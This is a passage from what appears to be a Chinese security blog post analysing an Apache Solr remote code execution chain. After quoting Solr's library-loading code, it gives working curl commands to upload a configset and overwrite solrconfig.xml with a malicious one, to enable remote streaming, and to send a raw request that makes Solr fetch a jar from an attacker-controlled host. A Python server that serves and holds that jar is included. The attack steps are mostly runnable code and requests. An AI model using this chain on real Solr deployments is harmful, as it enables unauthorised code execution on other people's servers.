+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kd">private</span> <span class="kt">void</span> <span class="nf">initLibs</span><span class="o">(</span><span class="n">SolrResourceLoader</span> <span class="n">loader</span><span class="o">,</span> <span class="kt">boolean</span> <span class="n">isConfigsetTrusted</span><span class="o">)</span> <span class="o">{</span>
+  <span class="c1">// TODO Want to remove SolrResourceLoader.getInstancePath; it can be on a Standalone subclass.
+</span><span class="c1"></span>  <span class="c1">// For Zk subclass, it&#39;s needed for the time being as well.  We could remove that one if we
+</span><span class="c1"></span>  <span class="c1">// remove two things in SolrCloud: (1) instancePath/lib  and (2) solrconfig lib directives with
+</span><span class="c1"></span>  <span class="c1">// relative paths. Can wait till 9.0.
+</span><span class="c1"></span>  <span class="n">Path</span> <span class="n">instancePath</span> <span class="o">=</span> <span class="n">loader</span><span class="o">.</span><span class="na">getInstancePath</span><span class="o">();</span>
+  <span class="n">List</span><span class="o">&lt;</span><span class="n">URL</span><span class="o">&gt;</span> <span class="n">urls</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ArrayList</span><span class="o">&lt;&gt;();</span>
+
+  <span class="n">Path</span> <span class="n">libPath</span> <span class="o">=</span> <span class="n">instancePath</span><span class="o">.</span><span class="na">resolve</span><span class="o">(</span><span class="s">&#34;lib&#34;</span><span class="o">);</span>
+  <span class="k">if</span> <span class="o">(</span><span class="n">Files</span><span class="o">.</span><span class="na">exists</span><span class="o">(</span><span class="n">libPath</span><span class="o">))</span> <span class="o">{</span>
+    <span class="k">try</span> <span class="o">{</span>
+      <span class="n">urls</span><span class="o">.</span><span class="na">addAll</span><span class="o">(</span><span class="n">SolrResourceLoader</span><span class="o">.</span><span class="na">getURLs</span><span class="o">(</span><span class="n">libPath</span><span class="o">));</span>
+    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+      <span class="n">log</span><span class="o">.</span><span class="na">warn</span><span class="o">(</span><span class="s">&#34;Couldn&#39;t add files from {} to classpath: {}&#34;</span><span class="o">,</span> <span class="n">libPath</span><span class="o">,</span> <span class="n">e</span><span class="o">);</span>
+    <span class="o">}</span>
+  <span class="o">}</span>
+
+  <span class="n">List</span><span class="o">&lt;</span><span class="n">ConfigNode</span><span class="o">&gt;</span> <span class="n">nodes</span> <span class="o">=</span> <span class="n">root</span><span class="o">.</span><span class="na">getAll</span><span class="o">(</span><span class="s">&#34;lib&#34;</span><span class="o">);</span>
+  <span class="k">if</span> <span class="o">(</span><span class="n">nodes</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">nodes</span><span class="o">.</span><span class="na">size</span><span class="o">()</span> <span class="o">&gt;</span> <span class="n">0</span><span class="o">)</span> <span class="o">{</span>
+    <span class="k">if</span> <span class="o">(!</span><span class="n">isConfigsetTrusted</span><span class="o">)</span> <span class="o">{</span>
+      <span class="k">throw</span> <span class="k">new</span> <span class="n">SolrException</span><span class="o">(</span>
+          <span class="n">ErrorCode</span><span class="o">.</span><span class="na">UNAUTHORIZED</span><span class="o">,</span>
+          <span class="s">&#34;The configset for this collection was uploaded without any authentication in place,&#34;</span>
+              <span class="o">+</span> <span class="s">&#34; and use of &lt;lib&gt; is not available for collections with untrusted configsets. To use this component, re-upload the configset&#34;</span>
+              <span class="o">+</span> <span class="s">&#34; after enabling authentication and authorization.&#34;</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="n">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">nodes</span><span class="o">.</span><span class="na">size</span><span class="o">();</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
+      <span class="n">ConfigNode</span> <span class="n">node</span> <span class="o">=</span> <span class="n">nodes</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">i</span><span class="o">);</span>
+      <span class="n">String</span> <span class="n">baseDir</span> <span class="o">=</span> <span class="n">node</span><span class="o">.</span><span class="na">attr</span><span class="o">(</span><span class="s">&#34;dir&#34;</span><span class="o">);</span>
+      <span class="n">String</span> <span class="n">path</span> <span class="o">=</span> <span class="n">node</span><span class="o">.</span><span class="na">attr</span><span class="o">(</span><span class="n">PATH</span><span class="o">);</span>
+      <span class="k">if</span> <span class="o">(</span><span class="kc">null</span> <span class="o">!=</span> <span class="n">baseDir</span><span class="o">)</span> <span class="o">{</span>
+        <span class="c1">// :TODO: add support for a simpler &#39;glob&#39; mutually exclusive of regex
+</span><span class="c1"></span>        <span class="n">Path</span> <span class="n">dir</span> <span class="o">=</span> <span class="n">instancePath</span><span class="o">.</span><span class="na">resolve</span><span class="o">(</span><span class="n">baseDir</span><span class="o">);</span>
+        <span class="n">String</span> <span class="n">regex</span> <span class="o">=</span> <span class="n">node</span><span class="o">.</span><span class="na">attr</span><span class="o">(</span><span class="s">&#34;regex&#34;</span><span class="o">);</span>
+        <span class="k">try</span> <span class="o">{</span>
+          <span class="k">if</span> <span class="o">(</span><span class="n">regex</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="n">urls</span><span class="o">.</span><span class="na">addAll</span><span class="o">(</span><span class="n">SolrResourceLoader</span><span class="o">.</span><span class="na">getURLs</span><span class="o">(</span><span class="n">dir</span><span class="o">));</span>
+          <span class="k">else</span> <span class="n">urls</span><span class="o">.</span><span class="na">addAll</span><span class="o">(</span><span class="n">SolrResourceLoader</span><span class="o">.</span><span class="na">getFilteredURLs</span><span class="o">(</span><span class="n">dir</span><span class="o">,</span> <span class="n">regex</span><span class="o">));</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+          <span class="n">log</span><span class="o">.</span><span class="na">warn</span><span class="o">(</span><span class="s">&#34;Couldn&#39;t add files from {} filtered by {} to classpath: {}&#34;</span><span class="o">,</span> <span class="n">dir</span><span class="o">,</span> <span class="n">regex</span><span class="o">,</span> <span class="n">e</span><span class="o">);</span>
+        <span class="o">}</span>
+      <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="kc">null</span> <span class="o">!=</span> <span class="n">path</span><span class="o">)</span> <span class="o">{</span>
+        <span class="kd">final</span> <span class="n">Path</span> <span class="n">dir</span> <span class="o">=</span> <span class="n">instancePath</span><span class="o">.</span><span class="na">resolve</span><span class="o">(</span><span class="n">path</span><span class="o">);</span>
+        <span class="k">try</span> <span class="o">{</span>
+          <span class="n">urls</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">dir</span><span class="o">.</span><span class="na">toUri</span><span class="o">().</span><span class="na">toURL</span><span class="o">());</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">MalformedURLException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+          <span class="n">log</span><span class="o">.</span><span class="na">warn</span><span class="o">(</span><span class="s">&#34;Couldn&#39;t add file {} to classpath: {}&#34;</span><span class="o">,</span> <span class="n">dir</span><span class="o">,</span> <span class="n">e</span><span class="o">);</span>
+        <span class="o">}</span>
+      <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+        <span class="k">throw</span> <span class="k">new</span> <span class="n">RuntimeException</span><span class="o">(</span><span class="s">&#34;lib: missing mandatory attributes: &#39;dir&#39; or &#39;path&#39;&#34;</span><span class="o">);</span>
+      <span class="o">}</span>
+    <span class="o">}</span>
+  <span class="o">}</span>
+
+  <span class="k">if</span> <span class="o">(!</span><span class="n">urls</span><span class="o">.</span><span class="na">isEmpty</span><span class="o">())</span> <span class="o">{</span>
+    <span class="n">loader</span><span class="o">.</span><span class="na">addToClassLoader</span><span class="o">(</span><span class="n">urls</span><span class="o">);</span>
+    <span class="n">loader</span><span class="o">.</span><span class="na">reloadLuceneSPI</span><span class="o">();</span>
+  <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>‍</p>
+<p>那么我们就得创建一个带恶意配置文件SolrConfig.xml的schema了</p>
+<p>但是直接新建scheme，会报错失败</p>
+<p><img src="/assets/image-20230418144140-tszma8e.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image"
+	
+	
+>​</p>
+<p>这是因为他的加载机制，由于是cloud部署，所以他默认会去zookeeper里加载</p>
+<p><img src="/assets/image-20230418150150-cryau2k.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image"
+	
+	
+>​</p>
+<p>这里会找传上去的conf文件夹，但是是找不到的，因为这里多拼接一个<code>.designer</code>​</p>
+<p><img src="/assets/image-20230418150342-627e4fx.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image"
+	
+	
+>​</p>
+<p>但是这里还是有解决办法，分开单独来传</p>
+<p>首先传我们的Configset，可以直接套用他自带的Configset，位置在<code>solr/configsets</code>​ ，挑一个压缩后上传就行，上传用API</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="nx">curl</span> <span class="o">-</span><span class="nx">X</span> <span class="nx">POST</span> <span class="o">--</span><span class="nx">header</span> <span class="s">&#34;Content-Type:application/octet-stream&#34;</span> <span class="o">--</span><span class="nx">data</span><span class="o">-</span><span class="nx">binary</span> <span class="err">@</span><span class="nx">sdconfigset</span><span class="p">.</span><span class="nx">zip</span> <span class="s">&#34;http://127.0.0.1:8983/solr/admin/configs?action=UPLOAD&amp;name=xxx&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>但是前面说了，里面的配置文件无法读取到，所以我们再单独把恶意的配置文件传上去，这里注意，这个API是可以指定参数<code>filepath</code>​和<code>overwrite</code>​的，这也是我们绕过的关键</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="nx">curl</span> <span class="o">-</span><span class="nx">X</span> <span class="nx">POST</span> <span class="o">--</span><span class="nx">header</span> <span class="s">&#34;Content-Type:application/octet-stream&#34;</span> <span class="o">--</span><span class="nx">data</span><span class="o">-</span><span class="nx">binary</span> <span class="err">@</span><span class="nx">solrconfig</span><span class="p">.</span><span class="nx">xml</span> <span class="s">&#34;http://127.0.0.1:8983/solr/admin/configs?action=UPLOAD&amp;name=xxx&amp;filePath=solrconfig.xml&amp;overwrite=true&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>可以看到这里就传上去了</p>
+<p><img src="/assets/image-20230418153143-d6u7quk.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image"
+	
+	
+>​​</p>
+<p>这个时候，就到最后一步了，我们需要加载jar包，加载的方法就是通过solrconfig.xml里面的lib标签去指定，但是我们没有入口传入jar包，所以我们只能通过临时文件的方法去加载jar包</p>
+<p>这里又有一个接口，solr允许开启远程资源加载，开启后可以使用jar协议去远程加载jar包，本地会落地成临时文件</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plaintext" data-lang="plaintext">curl -d &#39;{  &#34;set-property&#34; : {&#34;requestDispatcher.requestParsers.enableRemoteStreaming&#34;:true}}&#39; http://127.0.0.1:8983/solr/gettingstarted_shard1_replica_n1/config -H &#39;Content-type:application/json&#39;
+</code></pre></td></tr></table>
+</div>
+</div><p>发包</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plaintext" data-lang="plaintext">POST /solr/gettingstarted_shard2_replica_n1/debug/dump?param=ContentStreams HTTP/1.1
+Host: 192.168.220.16:8983
+User-Agent: curl/7.74.0
+Accept: */*
+Content-Length: 196
+Content-Type: multipart/form-data; boundary=------------------------5897997e44b07bf9
+Connection: close
+
+--------------------------5897997e44b07bf9
+Content-Disposition: form-data; name=&#34;stream.url&#34;
+
+jar:http://vps:port/calc.jar?!/xxx.class
+--------------------------5897997e44b07bf9--
+</code></pre></td></tr></table>
+</div>
+</div><p>由于需要生成临时文件，所以这个连接我们不能断，这里脚本借用360的</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">sys</span> 
+<span class="kn">import</span> <span class="nn">time</span> 
+<span class="kn">import</span> <span class="nn">threading</span> 
+<span class="kn">import</span> <span class="nn">socketserver</span> 
+<span class="kn">from</span> <span class="nn">urllib.parse</span> <span class="kn">import</span> <span class="n">quote</span> 
+<span class="kn">import</span> <span class="nn">http.client</span> <span class="k">as</span> <span class="nn">httpc</span> 
+
+<span class="n">listen_host</span> <span class="o">=</span> <span class="s1">&#39;0.0.0.0&#39;</span> 
+<span class="n">listen_port</span> <span class="o">=</span> <span class="mi">7777</span> 
+<span class="n">jar_file</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+
+<span class="k">class</span> <span class="nc">JarRequestHandler</span><span class="p">(</span><span class="n">socketserver</span><span class="o">.</span><span class="n">BaseRequestHandler</span><span class="p">):</span>  
+    <span class="k">def</span> <span class="nf">handle</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="n">http_req</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;&#39;</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;New connection:&#39;</span><span class="p">,</span><span class="bp">self</span><span class="o">.</span><span class="n">client_address</span><span class="p">)</span>
+        <span class="k">while</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\r\n\r\n</span><span class="s1">&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">http_req</span><span class="p">:</span>
+            <span class="k">try</span><span class="p">:</span>
+                <span class="n">http_req</span> <span class="o">+=</span> <span class="bp">self</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span>
+                <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\r\n</span><span class="s1">Client req:</span><span class="se">\r\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="n">http_req</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+                <span class="n">jf</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">jar_file</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span>
+                <span class="n">contents</span> <span class="o">=</span> <span class="n">jf</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+                <span class="n">headers</span> <span class="o">=</span> <span class="p">(</span><span class="s1">&#39;&#39;&#39;HTTP/1.0 200 OK</span><span class="se">\r\n</span><span class="s1">&#39;&#39;&#39;</span>
+                <span class="s1">&#39;&#39;&#39;Content-Type: application/java-archive</span><span class="se">\r\n\r\n</span><span class="s1">&#39;&#39;&#39;</span><span class="p">)</span>
+                <span class="bp">self</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">headers</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;ascii&#39;</span><span class="p">))</span>
+                <span class="bp">self</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">contents</span><span class="p">[])</span>
+                <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">300000</span><span class="p">)</span>
+                <span class="nb">print</span><span class="p">(</span><span class="mi">30</span><span class="p">)</span>
+                <span class="bp">self</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">contents</span><span class="p">[])</span>
+
+            <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+                <span class="nb">print</span> <span class="p">(</span><span class="s2">&#34;get error at:&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
+
+
+
+            
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+
+    <span class="n">jarserver</span> <span class="o">=</span> <span class="n">socketserver</span><span class="o">.</span><span class="n">TCPServer</span><span class="p">((</span><span class="n">listen_host</span><span class="p">,</span><span class="n">listen_port</span><span class="p">),</span> <span class="n">JarRequestHandler</span><span class="p">)</span> 
+    <span class="nb">print</span> <span class="p">(</span><span class="s1">&#39;waiting for connection...&#39;</span><span class="p">)</span> 
+    <span class="n">server_thread</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">jarserver</span><span class="o">.</span><span class="n">serve_forever</span><span class="p">)</span> 
+    <span class="n">server_thread</span><span class="o">.</span><span class="n">daemon</span> <span class="o">=</span> <span class="kc">True</span> 
+    <span class="n">server_thread</span><span class="o">.</span><span class="n">start</span><span class="p">()</span> 
+    <span class="n">server_thread</span><span class="o">.</span><span class="n">join</span><span class="p">()</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>因为这里会去读jar，所以其实还是有办法不出网利用的，但是这里不多赘述了。</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/post/zentao_rce/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Zentaopms前台权限绕过&#43;后台远程命令执行漏洞分析</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/post/yapi/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">YApi远程命令执行漏洞分析</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/post/cve-2022-40871/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">[CVE-2022-40871] Dolibarr任意添加管理员与RCE漏洞分析</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/post/cve-2022-2633/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">[CVE-2022-2633] WordPress All-in-One插件SSRF&#43;任意文件下载</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/post/%E4%BF%A1%E5%91%BCoa2.3.1%E7%89%88%E6%9C%AC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">[代码审计]信呼OA2.3.1版本代码审计</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2023 Huamang
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        <span id="busuanzi_container_page_pv"> 阅读量 <span id="busuanzi_value_page_pv"></span> 次 </span>
+        <br>
+        
+        <span class="icp"><a href="https://beian.miit.gov.cn/" target="_blank">赣ICP备2021001334号</a></span>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+    </body>
+</html>
